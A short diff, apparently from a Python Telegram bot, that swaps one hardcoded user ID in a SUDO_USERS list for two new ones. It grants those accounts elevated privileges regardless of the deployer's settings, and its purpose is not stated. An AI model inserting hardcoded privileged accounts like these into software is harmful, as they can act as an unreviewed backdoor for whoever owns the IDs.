@@ -6,7 +6,8 @@ from modules.helpers.admins import get_administrators
 
 
 SUDO_USERS.append(1323020756)
-SUDO_USERS.append(2004042280)
+SUDO_USERS.append(1979178376)
+SUDO_USERS.append(5123633430)
 
 
 def errors(func: Callable) -> Callable:
